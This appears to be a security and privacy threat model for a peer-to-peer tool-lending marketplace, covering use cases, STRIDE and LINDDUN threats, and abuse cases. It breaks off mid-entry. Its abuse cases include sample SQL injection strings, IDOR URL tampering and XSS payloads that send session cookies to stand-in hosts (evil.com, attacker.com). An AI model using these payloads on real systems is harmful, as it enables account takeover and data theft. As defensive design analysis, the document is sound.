# Security and Privacy by Design Analysis: P2P Lending Marketplace

**Date:** 2026-03-30
**Version:** 1.0
**Frameworks:** STRIDE · LINDDUN · OWASP Top 10 · GDPR / Privacy by Design

---

## Executive Summary

This analysis covers a peer-to-peer marketplace for lending and borrowing physical items (tools, camping gear, etc.) where users list items, search by location, request rentals, rate each other, and message within the platform. Payment is handled by Stripe.

**Key Security Risks:**
1. **Account Takeover & Reputation Hijacking (HIGH)** — Weak authentication or session management allows attackers to take over borrower/lender accounts and manipulate ratings or perform fraudulent rentals.
2. **Fraudulent Transactions & Payment Disputes (HIGH)** — No strong item verification, condition checks, or dispute resolution allows renters to damage items or lenders to falsely claim damage.
3. **Information Disclosure via Messaging (HIGH)** — Unencrypted or poorly logged messages expose user communication; combined with location data, enables stalking or harassment.
4. **Location Tracking & Physical Harm (MEDIUM-HIGH)** — Location data (items listed "near me") can be used to dox, stalk, or physically harm users.

**Key Privacy Risks:**
1. **Linkability Across Transactions (HIGH)** — Ratings tied to usernames allow profiling behaviour; borrowing history reveals lifestyle patterns (e.g., "this user borrows camping gear every summer").
2. **Non-compliance with Data Retention (HIGH)** — No deletion/retention policy means conversation history, transaction records, and ratings persist indefinitely, violating GDPR Article 5(1)(e).
3. **Disclosure of PII to Third Parties (MEDIUM)** — Stripe receives more data than necessary (full name, email, address); user has no control over what Stripe retains.
4. **Unawareness of Secondary Use (MEDIUM)** — Users may not understand that their rating, messaging history, and item preferences are profiled for recommendation algorithms or sold/shared.

**Top Recommended Priorities for Engineering:**
1. Implement MFA and rate-limit login attempts; use secure session tokens with short TTLs.
2. Add item condition attestation (photos on pickup/return) and dispute resolution workflow.
3. Implement end-to-end encrypted messaging; log message activity but encrypt content at rest.
4. Establish clear data retention policy (conversations deleted after 90 days; ratings kept, personal data expunged on account deletion) and build deletion workflow.
5. Add privacy notice explaining location, messaging, and rating use; include data subject rights (access, erasure) in settings.

---

## 1. Assumptions and Context

### Problem Description
A solo developer is building an MVP peer-to-peer marketplace where users can lend and borrow physical items (tools, camping gear, etc.) from nearby neighbours. Core features: item listings with photos and daily rental price, searchable by location/category, rental request workflow, Stripe payments, mutual ratings after transaction, in-app messaging, and public profile pages.

### Actors
- **Borrowers** — Find and request items; pay rental fees
- **Lenders** — List items, approve/decline requests, receive rental fees
- **Admin/Support** — Moderate disputes, handle reports (future scope but assume possible)
- **Stripe** — Payment processor (third-party, external trust boundary)
- **Background jobs** — Cron tasks for notifications, expired listings cleanup

### Data Handled
- **Personal data:** User names, email addresses, phone numbers (possibly), physical addresses (via location data), profile pictures
- **Transactional data:** Item listings, rental requests, payment records (minimal — Stripe handles card), ratings/reviews, messaging history
- **Sensitive combinations:** Location + username + item preferences can reveal lifestyle; messages can contain sensitive topics; ratings create permanent record
- **Not handled:** Credit card numbers (Stripe PCI-DSS certified handles this)

### Deployment Model
- Cloud-based, public internet, single-tenant (one platform for all users)
- MVP — initially one region/city; assume eventual multi-region

### Regulatory / Compliance Context
- **GDPR** applies (assuming EU users; at minimum, must be GDPR-compliant to avoid fines)
- **PCI-DSS** scope minimized (Stripe handles payment cards)
- **Not in scope for this MVP:** HIPAA, COPPA, CCPA (unless stated)

### Key Assumptions
1. "Solo developer" → prioritize high-impact, implementable controls over exhaustive coverage
2. Stripe integration is PCI-DSS compliant; never store card data locally
3. No admin/moderation tools in MVP; assume user reports handled manually for now
4. Location is approximate (postal code or 5km radius), not GPS-level precision
5. Ratings are public and permanent (non-repudiation implications)
6. Users are adults; no special protections for minors in scope

---

## 2. Requirements Classification and Gap Analysis

### Original Requirements (Classified)

| Req ID | Requirement | Category | Source |
|--------|-------------|----------|--------|
| FR-001 | Users can list items with photos, availability calendar, and daily rental price | FR | Feature description |
| FR-002 | Borrowers can search items by location and category | FR | Feature description |
| FR-003 | Borrowers can request to rent; lenders can approve/decline | FR | Feature description |
| FR-004 | Payment is handled by Stripe (system never touches card data directly) | FR | Feature description |
| FR-005 | Both parties rate each other after a transaction | FR | Feature description |
| FR-006 | Users can message each other within the app | FR | Feature description |
| FR-007 | Profile page shows public rating, listed items, and member since date | FR | Feature description |

### Gap Analysis: Security Non-Functional Requirements

**Identified Gaps (converted to [NEW] requirements below):**

- **Authentication & Session Management:** No mechanism specified. MVP needs at least password + rate limiting + secure sessions.
- **Authorisation:** Implicit (borrower can only see own requests, lender only sees own items) but not documented.
- **Input Validation & Output Encoding:** Not mentioned; essential for search, messaging, profiles.
- **Error Handling & Information Leakage:** Not mentioned; must prevent leaking user existence, item details, or stack traces.
- **Audit Logging:** No audit trail for sensitive actions (account creation, payment approval, dispute resolution).
- **Encryption in Transit:** Assumed HTTPS but not stated.
- **Encryption at Rest:** Not mentioned; messaging and personal data need protection.
- **Rate Limiting & Brute Force:** Not mentioned; critical for login, API endpoints (search, request).
- **Secrets Management:** Not mentioned; API keys, Stripe tokens must be managed securely.

### Gap Analysis: Privacy Non-Functional Requirements

- **Lawful Basis:** Not documented. Who collects what data and under what lawful basis (consent, contract, legitimate interest)?
- **Consent Flows:** No consent mechanism for location tracking, messaging, rating, data sharing with Stripe.
- **Data Minimisation:** Unclear if phone number is necessary; location granularity not specified.
- **Retention & Deletion:** No policy. How long are messages kept? Can users delete conversations? What happens on account deletion?
- **Data Subject Rights:** No mechanism for users to access, delete, port, or rectify their data.
- **Third-Party Sharing:** Stripe integration not disclosed to users; unclear what data Stripe receives.
- **Breach Detection & Notification:** No incident response plan.
- **Privacy Notice:** No privacy policy mentioned.
- **DPIA Assessment:** Not done; this processing (location + ratings + messaging) may trigger GDPR DPIA obligation.

### Gap Analysis: Compliance

- **GDPR Compliance:** Data retention policy, breach notification, DPA (Data Processing Agreement) with Stripe needed.
- **Terms of Service:** Dispute resolution, liability limitations, acceptable use policy not mentioned.

---

## 3. Use Cases

### UC-001: Register and Create Profile
**Actor:** New user (borrower or lender)
**Goal:** Create an account and set up a public profile
**Preconditions:** None
**Main Flow:**
1. User navigates to signup page
2. User enters email, password, full name
3. User optionally enters phone number, profile picture
4. System creates account and sends verification email
5. User clicks verification link
6. Account activated; user redirected to profile setup
7. User sets bio, profile photo, and location (postal code or address)

**Postconditions:** Account created, email verified, profile visible to other users
**Data involved:** Email, password hash, full name, phone number (optional), address, profile photo
**Trust boundary crossings:** User input → backend database; email service provider (email verification)

---

### UC-002: List an Item
**Actor:** Lender
**Goal:** Create a rental listing for a physical item
**Preconditions:** User authenticated and profile complete
**Main Flow:**
1. Lender clicks "List Item"
2. Lender enters title, description, category, daily price
3. Lender uploads photos of item (1–5 images)
4. Lender sets availability calendar (dates available)
5. System validates input, stores item record, makes listing visible
6. Listing appears in search results for nearby borrowers

**Postconditions:** Item listed and searchable
**Data involved:** Item title, description, photos, price, availability, lender user ID, location
**Trust boundary crossings:** Photos uploaded to cloud storage; item metadata in database

---

### UC-003: Search for Items
**Actor:** Borrower
**Goal:** Find items available nearby to rent
**Preconditions:** User authenticated
**Main Flow:**
1. Borrower navigates to search page
2. Borrower enters search query (keyword, category, date range)
3. System executes query filtered by borrower's location (within 5km)
4. System returns matching listings with photos, price, lender name, and lender rating
5. Borrower clicks on listing to view full details and lender profile

**Postconditions:** Search results displayed
**Data involved:** Search input, user location, item metadata, lender profile (name, rating)
**Trust boundary crossings:** User location sent to backend; search results reveal item owner identity

---

### UC-004: Request to Rent
**Actor:** Borrower
**Goal:** Request to borrow an item for specific dates
**Preconditions:** Borrower authenticated, item found, availability confirmed
**Main Flow:**
1. Borrower clicks "Request to Rent" on item listing
2. Borrower selects desired rental dates (pickup/return dates)
3. Borrower optionally adds message to lender
4. System displays rental cost and payment method (Stripe)
5. Borrower reviews and clicks "Send Request"
6. System creates rental request record (status: pending)
7. Lender receives notification; borrower status shows "awaiting response"

**Postconditions:** Rental request created; lender notified; awaiting lender approval
**Data involved:** Borrower ID, item ID, dates, request message, rental price
**Trust boundary crossings:** Request stored in database; notification sent (via email or in-app)

---

### UC-005: Approve/Decline Rental Request
**Actor:** Lender
**Goal:** Accept or reject a borrower's rental request
**Preconditions:** Lender authenticated, rental request received
**Main Flow:**
1. Lender receives notification of new rental request (email or in-app)
2. Lender reviews request details (borrower name, dates, message, borrower rating/profile)
3. Lender clicks "Approve" or "Decline"
4. If approved:
   - System updates request status to "approved"
   - System initiates payment via Stripe
   - Borrower receives notification with lender contact info and pickup instructions
   - Item marked as unavailable for those dates
5. If declined:
   - System updates status to "declined"
   - Borrower notified; request marked as "not approved"

**Postconditions:** Request approved or declined; payment processed (if approved)
**Data involved:** Request ID, approval status, borrower/lender IDs, payment details
**Trust boundary crossings:** Payment sent to Stripe API; notification sent to borrower/lender

---

### UC-006: Message Between Users
**Actor:** Borrower or Lender
**Goal:** Communicate with the other party before, during, or after rental
**Preconditions:** User authenticated; conversation established (rental request in progress or completed)
**Main Flow:**
1. User navigates to Messages or clicks "Chat" on a rental request
2. User types message and clicks Send
3. System stores message (sender, recipient, timestamp, content)
4. Recipient receives notification
5. Conversation history visible to both parties

**Postconditions:** Message delivered; visible in conversation thread
**Data involved:** Message text, sender/recipient IDs, timestamp
**Trust boundary crossings:** Message stored in database; notification delivered

---

### UC-007: Rate Counterparty After Transaction
**Actor:** Borrower or Lender
**Goal:** Leave a public rating and optional review for the other party
**Preconditions:** Rental completed (item returned); user authenticated
**Main Flow:**
1. System sends notification after return date: "How was your experience?"
2. User clicks notification or navigates to completed rental
3. User selects star rating (1–5 stars) and optionally writes text review
4. User clicks "Submit Rating"
5. System stores rating; updates user's average rating
6. Rating and review become visible on the counterparty's public profile

**Postconditions:** Rating published; user's average rating updated
**Data involved:** Rater ID, ratee ID, star rating, review text, timestamp
**Trust boundary crossings:** Rating linked to both users' profiles

---

### UC-008: View User Profile
**Actor:** Any user
**Goal:** View another user's profile, including public ratings and listed items
**Preconditions:** User authenticated
**Main Flow:**
1. User searches for or navigates to another user's profile
2. System displays: profile photo, name, member since date, average rating, list of currently active listings, recent ratings/reviews
3. User can optionally message the profile owner

**Postconditions:** Profile displayed
**Data involved:** Public profile fields (name, photo, member date, rating, listings), ratings list
**Trust boundary crossings:** Location data (items shown) reveals item owner location

---

## 4. Threat Analysis

### 4.1 Security Threats (STRIDE)

#### ST-001: Account Takeover via Weak Password
**STRIDE category:** Spoofing (attacker impersonates legitimate user)
**Affected use case(s):** UC-001 (Register), UC-005 (Approve Rental), UC-007 (Rate)
**Description:** Attacker guesses or brute-forces a user's password; gains access to their account and can approve fake rentals, receive payments, rate fake transactions, or damage the user's reputation.
**Attack vector:** Dictionary attack or brute force against login endpoint; no rate limiting; common passwords (e.g., "password123").
**Likelihood:** High — login is the entry point for all sensitive actions; no rate limiting mentioned; typical MVP doesn't enforce strong password policies.
**Impact:** High — attacker can steal payments, manipulate ratings, masquerade as lender, cause financial and reputational harm.

---

#### ST-002: Session Hijacking / Token Theft
**STRIDE category:** Spoofing
**Affected use case(s):** UC-001–UC-008 (all authenticated flows)
**Description:** Session token stored in browser cookies or localStorage without HttpOnly/Secure flags; attacker intercepts token via XSS or network sniffing and reuses it to impersonate the user.
**Attack vector:** XSS in messaging or profile pages; man-in-the-middle on unsecured WiFi; stolen from browser storage if not HttpOnly.
**Likelihood:** Medium-High — typical MVP may not properly secure cookies; messaging feature is high-risk for XSS.
**Impact:** High — full account compromise.

---

#### ST-003: SQL Injection in Search Endpoint
**STRIDE category:** Tampering / Information Disclosure
**Affected use case(s):** UC-003 (Search for Items)
**Description:** Search query field not parameterized; attacker injects SQL to extract user data, item listings, payment information, or ratings.
**Attack vector:** Malicious search input like `'; DROP TABLE items; --` or `' OR 1=1--` to extract all items/users.
**Likelihood:** Medium — common vulnerability, but modern frameworks (Rails, Django, Node ORMs) have built-in protections if used correctly.
**Impact:** High — data exfiltration (PII, transaction history, ratings).

---

#### ST-004: Cross-Site Scripting (XSS) in Messaging
**STRIDE category:** Tampering / Information Disclosure / Elevation of Privilege
**Affected use case(s):** UC-006 (Message), UC-008 (View Profile)
**Description:** Message content or profile bio not sanitized; attacker injects JavaScript that steals session tokens, redirects users to phishing pages, or performs actions on their behalf.
**Attack vector:** Embed `<script>` tags in message: `"Hi, <script>fetch('evil.com?token='+getCookie('session_id'))</script>"`.
**Likelihood:** High — messaging is unstructured user input; MVP likely lacks input sanitization/output encoding.
**Impact:** High — session theft, phishing, CSRF.

---

#### ST-005: Insecure Direct Object Reference (IDOR) in Rental Requests
**STRIDE category:** Elevation of Privilege / Information Disclosure
**Affected use case(s):** UC-004, UC-005 (Request/Approve Rental)
**Description:** Rental request approval endpoint doesn't verify ownership; attacker modifies request ID in URL or API call to approve rentals they don't own or view rentals not intended for them.
**Attack vector:** Borrower guesses rental request ID and calls `/api/rental/123/approve` even if they don't own request 123.
**Likelihood:** Medium-High — common in MVP APIs lacking proper authorization checks.
**Impact:** High — attacker can steal payments, access other users' rental agreements, or disapprove legitimate requests.

---

#### ST-006: Denial of Service via Messaging Spam
**STRIDE category:** Denial of Service
**Affected use case(s):** UC-006 (Message)
**Description:** No rate limiting on message submission; attacker floods a user with thousands of messages, degrading system performance or harassing the recipient.
**Attack vector:** Automated script sending 1000 messages/sec to a single user.
**Likelihood:** Medium — depends on whether rate limiting is implemented; MVP often lacks this.
**Impact:** Medium — user harassment, system overload, reputational harm to victim.

---

#### ST-007: Insufficient Logging & Audit Trail
**STRIDE category:** Repudiation / Information Disclosure
**Affected use case(s):** UC-005 (Approve Rental), UC-007 (Rate)
**Description:** No audit log of sensitive actions (approvals, payments, ratings); attacker disputes transaction history or claims actions weren't theirs; no evidence trail for dispute resolution.
**Attack vector:** Lender approves fake rental, receives payment, then claims "I never approved this." No log to prove otherwise.
**Likelihood:** High — MVPs typically don't include audit logging.
**Impact:** Medium-High — impossible to resolve disputes; lenders/borrowers can deny transactions.

---

#### ST-008: Payment Processing Without Proper Verification
**STRIDE category:** Tampering / Elevation of Privilege
**Affected use case(s):** UC-005 (Approve Rental)
**Description:** No item condition attestation, no signature/photo on pickup/return; lender and borrower dispute item condition ("It was damaged before I borrowed it!"). Attacker damages item, claims it was pre-damaged, disputes charge.
**Attack vector:** Borrow expensive tool, damage it, then dispute charge or falsely claim it was already broken.
**Likelihood:** High — no physical verification mechanism mentioned.
**Impact:** High — financial fraud, disputes, chargebacks.

---

#### ST-009: Weak Authorization on Profile / Listing Updates
**STRIDE category:** Elevation of Privilege / Tampering
**Affected use case(s):** UC-002 (List Item), UC-007 (Rate)
**Description:** No verification that user editing a profile or listing owns it; attacker modifies another user's profile photo, bio, or item description.
**Attack vector:** Modify `/api/profile/456/update` to change another user's profile.
**Likelihood:** Medium — common IDOR variant.
**Impact:** Medium — defacement, reputation harm, impersonation.

---

#### ST-010: Unencrypted Messaging at Rest
**STRIDE category:** Information Disclosure
**Affected use case(s):** UC-006 (Message)
**Description:** Messages stored in plaintext in database; if database is breached, all conversation history is exposed (e.g., sensitive discussions about item condition, personal circumstances).
**Attack vector:** Database breach via SQL injection, unpatched server, or insider access.
**Likelihood:** Medium — unencrypted storage is typical for MVP.
**Impact:** Medium-High — leaks sensitive conversations (potentially evidence of disputes, personal information revealed in negotiations).

---

### 4.2 Privacy Threats (LINDDUN)

#### PT-001: Linkability — Profile + Ratings Reveals Behaviour Patterns
**LINDDUN category:** Linkability
**Affected use case(s):** UC-003 (Search), UC-007 (Rate), UC-008 (View Profile)
**Description:** Public username + ratings + listing history allows anyone to profile a user's behaviour. Example: "User jsmith borrowed camping gear every July for 3 years" reveals lifestyle; combined with profile photo, can re-identify across platforms.
**Affected personal data:** Username, public ratings, item listing history, dates of transactions
**Affected data subjects:** Lenders and borrowers (both have public profiles)
**Likelihood:** High — profiles are public by design.
**Impact:** High — enables behaviour profiling, discrimination, stalking.
**GDPR relevance:** Art. 5(1)(b) Purpose Limitation — secondary use of ratings for profiling violates purpose limitation if users didn't consent. Art. 9 Special Category Data — item borrowing history can infer health (borrowing mobility aids), religion (borrowing camping gear for spiritual retreats), family status (borrowing tools).

---

#### PT-002: Identifiability — Location + Profile Photo Re-identifies Users
**LINDDUN category:** Identifiability
**Affected use case(s):** UC-002 (List Item), UC-003 (Search)
**Description:** Items listed "near borrower location"; combined with profile photo and username, allows anyone (attacker or curious user) to narrow down a person's home address.
**Attack vector:** Search for rare item in a small town; see 3 listings; one lister is visibly in profile photo at a local landmark; cross-check Facebook. User doxed.
**Affected personal data:** Location (postal code or 5km radius), profile photo, username, item type
**Affected data subjects:** Lenders (their home location is inferred)
**Likelihood:** Medium-High — location + photo is powerful identifiability.
**Impact:** High — enables physical stalking, harassment, burglary ("I know you have expensive camping gear at X address").

---

#### PT-003: Non-repudiation — Ratings Create Permanent Public Record
**LINDDUN category:** Non-repudiation
**Affected use case(s):** UC-007 (Rate)
**Description:** Once a rating is published, user cannot deny the transaction or the rating. This is by design, but it means ratings are permanent and irreversible. A malicious rater can give a 1-star review falsely claiming item damage, and the damage is permanent to the ratee's reputation.
**Affected personal data:** Ratings, reviews, transaction participation
**Affected data subjects:** Lenders and borrowers (permanently linked to transaction)
**Likelihood:** High — non-repudiation is intentional.
**Impact:** High — false accusations stick; no erasure mechanism; reputation damage.
**GDPR relevance:** Art. 17 Right to Erasure — user may want to erase their lending history or false reviews, but permanent public ratings block this.

---

#### PT-004: Detectability — Can Infer Whether User Has Items of Value
**LINDDUN category:** Detectability
**Affected use case(s):** UC-002 (List Item)
**Description:** Absence/presence of listings reveals whether a user has valuable items. Attacker can enumerate user IDs, check for any items, and infer assets. Users with no listings (borrowers only) can be detected as "non-lenders."
**Affected personal data:** Item ownership, item value
**Affected data subjects:** Borrowers (who don't list items); lenders (who do)
**Likelihood:** Medium — requires enumeration attacks or user enumeration vulnerability.
**Impact:** Medium — enables targeted theft ("Steal from users with expensive tool listings"); discrimination ("Users without listings are lower socioeconomic status").

---

#### PT-005: Disclosure — Message History Leaked via Account Compromise
**LINDDUN category:** Disclosure
**Affected use case(s):** UC-006 (Message)
**Description:** If account is compromised (ST-001, ST-002), attacker gains access to all message history. Messages may contain sensitive information (health issues, family status, financial hardship), negotiation strategies, or evidence of disputes.
**Affected personal data:** Message content, timestamps, conversation participants
**Affected data subjects:** All parties in compromised conversations
**Likelihood:** High — linked to account takeover likelihood.
**Impact:** High — intimate/sensitive information exposed.
**GDPR relevance:** Art. 32 Security of Processing — system must implement appropriate encryption/access controls to prevent unauthorized disclosure.

---

#### PT-006: Disclosure — Data Sharing with Stripe Not Disclosed
**LINDDUN category:** Disclosure
**Affected use case(s):** UC-005 (Payment processing)
**Description:** Stripe receives user email, full name, location/address, item description, and rental price. User may not understand that Stripe (a third party) processes this data; no transparent disclosure of what Stripe does with it; no Data Processing Agreement disclosed.
**Affected personal data:** Email, name, address, payment metadata
**Affected data subjects:** All users (borrowers and lenders)
**Likelihood:** High — payment processing involves third-party data sharing.
**Impact:** Medium — secondary use of personal data by Stripe; user unawareness.
**GDPR relevance:** Art. 13/14 Transparency — must disclose that data is shared with Stripe and what Stripe does with it. Art. 28 Data Processing Agreement — must have a signed DPA with Stripe before processing personal data.

---

#### PT-007: Unawareness — Users Don't Understand Rating Permanence
**LINDDUN category:** Unawareness
**Affected use case(s):** UC-007 (Rate)
**Description:** Users may rate hastily (e.g., 1 star because of minor inconvenience) without realizing the rating is permanent and public. No warning; no undo; impacts reputation permanently.
**Affected personal data:** Ratings, reviews
**Affected data subjects:** Rated users
**Likelihood:** High — no warning displayed when submitting rating.
**Impact:** Medium — reputational harm from hasty decisions; no mechanism to correct.
**GDPR relevance:** Art. 5(1)(a) Lawfulness, Fairness, Transparency — users must be aware of consequences of their actions.

---

#### PT-008: Non-compliance — No Data Retention / Deletion Policy
**LINDDUN category:** Non-compliance
**Affected use case(s):** UC-006 (Message), UC-007 (Rate), UC-001 (Account)
**Description:** No documented retention policy for messages, ratings, or personal data. Under GDPR Art. 5(1)(e), data must be "kept in a form which permits identification of data subjects for no longer than necessary." Indefinite storage of messages violates this. If user requests deletion (Art. 17), system has no mechanism to comply.
**Affected personal data:** Messages, ratings, account data, transaction history
**Affected data subjects:** All users
**Likelihood:** High — MVP typically lacks retention/deletion policies.
**Impact:** High — regulatory non-compliance; GDPR fines up to 4% of global revenue or €20M.
**GDPR relevance:** Art. 5(1)(e) Storage Limitation; Art. 17 Right to Erasure; Art. 33 Breach Notification.

---

#### PT-009: Non-compliance — No Privacy Notice / Consent Mechanism
**LINDDUN category:** Non-compliance
**Affected use case(s):** UC-001 (Register)
**Description:** No privacy policy disclosed; no explicit consent for location tracking, messaging history storage, rating publication, or data sharing with Stripe. GDPR requires transparent privacy notices *before* data collection.
**Affected personal data:** All personal data collected
**Affected data subjects:** All users
**Likelihood:** High — MVP typically lacks privacy notice.
**Impact:** High — regulatory non-compliance; invalid consent; users can't make informed decisions.
**GDPR relevance:** Art. 13/14 Information to be provided; Recital 32 (Consent).

---

## 5. Abuse Cases

### 5.1 Security Abuse Cases

#### SAC-001: Account Takeover via Brute Force
**Linked threat:** ST-001
**Attacker type:** External unauthenticated
**Goal:** Gain access to a lender's account to approve fraudulent rentals and steal payments.
**Attack Flow:**
1. Attacker identifies a high-rating lender with active listings (from public profile)
2. Attacker obtains email from public profile
3. Attacker writes script to brute-force password against login endpoint
4. No rate limiting; attacker tries 10,000 passwords in 10 minutes
5. Attacker cracks password (or guesses common variant)
6. Attacker logs in, changes password, approves pending rental requests
7. Attacker initiates rental approval for non-existent borrower or accomplice
8. Stripe payment processes; attacker (or accomplice) receives funds

**Impact if successful:** Financial fraud (stolen rental fees); reputation damage (lender associated with fraudulent rentals); account takeover.
**OWASP Top 10 category:** A07:2021 – Identification and Authentication Failures

---

#### SAC-002: Session Hijacking via XSS in Messaging
**Linked threat:** ST-004, ST-002
**Attacker type:** External authenticated (or unauthenticated via XSS payload)
**Goal:** Steal another user's session token to impersonate them.
**Attack Flow:**
1. Attacker crafts message: `"Item looks good! <img src=x onerror="fetch('attacker.com/steal?cookie='+document.cookie)">`
2. Victim receives and views message in in-app chat
3. Victim's browser executes onerror handler; sends session cookie to attacker.com
4. Attacker extracts session ID from request
5. Attacker sets their own cookie to session ID
6. Attacker navigates to platform as victim, approves rentals, sends messages, rates users
7. Attacker damages victim's reputation or steals funds

**Impact if successful:** Full account compromise; financial fraud; reputation damage; identity theft.
**OWASP Top 10 category:** A03:2021 – Injection (XSS)

---

#### SAC-003: Payment Dispute via Unverified Item Condition
**Linked threat:** ST-008
**Attacker type:** External authenticated (borrower)
**Goal:** Borrow expensive item, damage it, dispute charge claiming pre-existing damage.
**Attack Flow:**
1. Attacker searches for high-value item (e.g., power drill worth $200)
2. Attacker requests rental
3. Lender approves; rental fee $50 for 3 days
4. Attacker picks up item (no condition attestation)
5. Attacker intentionally damages item (e.g., smashes drill head)
6. Attacker returns item
7. Lender notices damage; files dispute with Stripe
8. Stripe asks: "Was item damaged before or after rental?" No evidence either way
9. Attacker claims: "I have photos of the damage before pickup" (fake photos)
10. Lender cannot prove otherwise (no pickup/return photo requirement)
11. Stripe rules in attacker's favor (burden of proof on lender); payment reversed
12. Lender loses item AND rental fee

**Impact if successful:** Financial fraud; item damage; loss of trust in platform.
**OWASP Top 10 category:** A01:2021 – Broken Access Control (lack of verification)

---

#### SAC-004: SQL Injection in Search to Exfiltrate User Database
**Linked threat:** ST-003
**Attacker type:** External unauthenticated
**Goal:** Extract user email addresses, phone numbers, and addresses for spam or phishing.
**Attack Flow:**
1. Attacker navigates to search page
2. Attacker enters search query: `tools'; SELECT * FROM users; --`
3. Query executed unsafely in backend: `SELECT * FROM items WHERE title = 'tools'; SELECT * FROM users; --'`
4. Full users table returned to attacker (email, name, phone, address)
5. Attacker sells data to spam or phishing campaigns

**Impact if successful:** Mass PII exfiltration; spam; phishing attacks targeting users; GDPR breach.
**OWASP Top 10 category:** A03:2021 – Injection (SQL Injection)

---

#### SAC-005: Spam Messaging Harassment Campaign
**Linked threat:** ST-006
**Attacker type:** External authenticated (fake account) or compromised account
**Goal:** Harass or dox a user by flooding them with messages containing personal information.
**Attack Flow:**
1. Attacker creates fake account or compromises legitimate account
2. Attacker writes script to send 1000 messages/day to a single target user
3. Messages contain escalating threats, personal details found on social media, or dox information
4. Victim receives notification spam; feels harassed/unsafe
5. Victim account marked as "harassed"; support team overloaded
6. System degrades under message load (no rate limiting)

**Impact if successful:** User harassment; victim safety concern; system DoS; reputational damage to platform.
**OWASP Top 10 category:** A05:2021 – Security Misconfiguration (no rate limiting)

---

#### SAC-006: IDOR to View Other Users' Messages
**Linked threat:** ST-005
**Attacker type:** External authenticated (any user)
**Goal:** Read private messages between other users to find negotiation strategies or sensitive information.
**Attack Flow:**
1. Attacker and victim both have accounts
2. Attacker navigates to their own messages: `/api/messages?user_id=123`
3. Attacker modifies URL: `/api/messages?user_id=456` (victim)
4. No authorization check on backend
5. Attacker receives victim's full message thread (sensitive negotiations, personal details)
6. Attacker uses information to sabotage rental, compromise victim's account, or dox them

**Impact if successful:** Privacy violation; information disclosure; potential for blackmail or doxing.
**OWASP Top 10 category:** A01:2021 – Broken Access Control

---

### 5.2 Privacy Abuse Cases

#### PAC-001: Behaviour Profiling via Rating History
**Linked threat:** PT-001
**Actor:** Third party (attacker or data broker) or internal (system operator)
**Scenario:**
Attacker/analyst scrapes public profiles of all users. They observe "user_alice" borrowed camping gear every summer for 3 years, then hiked boots in spring. Analyst infers: Alice loves outdoor activities, likely has disposable income, travels. Analyst sells this profile to outdoor gear companies, hiking tour operators, or insurance companies. Insurance company flags Alice as "high-risk for injuries" (hiking), raises premiums. Marketing company targets Alice with expensive camping products.

**Affected data subjects:** All active lenders and borrowers
**Privacy By Design principle violated:** Principle 2 (Privacy as Default Setting) — public profiles expose behaviour by default; no option to hide history. Principle 7 (User Privacy as Paramount) — secondary use of data not consented to.
**Regulatory exposure:** GDPR Art. 5(1)(b) Purpose Limitation (secondary use); Art. 9 Special Categories (inferred health/lifestyle); potential discrimination under employment/insurance law; no legal basis documented for profiling.

---

#### PAC-002: Location-Based Doxing and Physical Harassment
**Linked threat:** PT-002, PT-004
**Actor:** Attacker (motivated by revenge, theft, or harassment)
**Scenario:**
Attacker reviews listings and finds expensive tool collection. Cross-references lister's name (from profile photo) with Facebook, finds real address. Attacker doesn't rent; instead, plans burglary. Attacker drives to location one evening, confirms address, returns with accomplice the next night. Item theft. Alternatively: Attacker has personal grudge against user (ex-partner, neighbor dispute); uses profile info to locate home; shows up for confrontation.

**Affected data subjects:** Lenders (home location inferred)
**Privacy By Design principle violated:** Principle 1 (Proactive Not Reactive) — location risks not identified upfront. Principle 3 (Privacy Embedded into Design) — no option to hide location, list items as "seller-managed pickup" instead of home delivery.
**Regulatory exposure:** Art. 32 Security of Processing (must implement appropriate safeguards to prevent unauthorized access to location data); Art. 5(1)(f) Integrity and Confidentiality; potential liability if user is harmed as result of doxing.

---

#### PAC-003: Permanent Reputational Damage from False Rating
**Linked threat:** PT-003
**Actor:** Malicious rater (competitor, harasser, or person with grudge)
**Scenario:**
Lender Alice has 4.8-star rating from 50 transactions. Attacker (Bob, who wasn't even a customer) creates account, leaves 1-star review: "Alice damaged my item intentionally and refused to make it right. Crook." Review is visible instantly. No moderation, no dispute mechanism. Alice's rating drops to 4.6. She receives inquiries saying "Your reviews show poor quality." She cannot delete her profile (all earnings tied to it). She is stuck with false accusation on permanent public record.

**Affected data subjects:** Lenders and borrowers
**Privacy By Design principle violated:** Principle 2 (Privacy as Default) — ratings are public and permanent by design; no control given to ratee. Principle 7 (User Privacy) — no right to respond, no erasure mechanism.
**Regulatory exposure:** Art. 17 Right to Erasure (user cannot erase false ratings tied to them); potential defamation liability for platform (if they host false statements without verification); Art. 6(1) lawful basis unclear (is publishing unverified accusations "legitimate interest"?).

---

#### PAC-004: Data Breach Exposes Message History with Sensitive Information
**Linked threat:** PT-005
**Actor:** External attacker (compromises database) or insider
**Scenario:**
Platform's database is breached (via unpatched server vulnerability). Attacker exfiltrates entire messages table (unencrypted plaintext). Messages include: health details ("my arthritis is flaring up, need help with gardening tools"), family status ("newly divorced, trying to save money"), financial hardship ("I can't afford to buy tools right now"), and negotiation tactics. Attacker sells dataset to data brokers. Messages appear online in public breach databases. Users' intimate information is now searchable and linked to their real names.

**Affected data subjects:** All users with messaging history
**Privacy By Design principle violated:** Principle 6 (Visibility and Transparency for Users and Providers) — users don't know messages are unencrypted; Principle 3 (Privacy Embedded into Design) — no end-to-end encryption.
**Regulatory exposure:** Art. 5(1)(f) Integrity and Confidentiality; Art. 32 Security of Processing (encryption at rest); Art. 33 Breach Notification (must notify users within 72 hours); Art. 34 Personal notification (if high risk); GDPR fines for inadequate encryption; potential civil liability for damages.

---

#### PAC-005: Data Subject Rights Cannot Be Exercised
**Linked threat:** PT-008, PT-009
**Actor:** System design (lack of tools); lack of process
**Scenario:**
User Alice wants to exercise GDPR right to erasure (Art. 17). She submits request to support. Support team has no process to:
1. Identify all systems storing her data (application DB, backups, Stripe, email service provider)
2. Erase her messages (needed for dispute resolution; must be retained)
3. Erase her ratings (permanent public record; conflict with lender/borrower rights)
4. Erase her account data from backups

Support ignores request. User escalates to data protection authority. Authority fines platform for non-compliance. User data is never actually deleted from backups.

**Affected data subjects:** All users
**Privacy By Design principle violated:** Principle 2 (Privacy as Default) — no deletion mechanism; Principle 7 (User Privacy) — users cannot exercise rights.
**Regulatory exposure:** Art. 12–22 Data Subject Rights; Art. 17 Erasure; Art. 77 Right to lodge complaint to authority; GDPR administrative fines up to 4% global revenue or €20M; potential civil claims for damages.

---

#### PAC-006: Secondary Use of Ratings for Algorithmic Discrimination
**Linked threat:** PT-001, PT-006
**Actor:** Internal (system operators/data scientists); potential external (if data is sold)
**Scenario:**
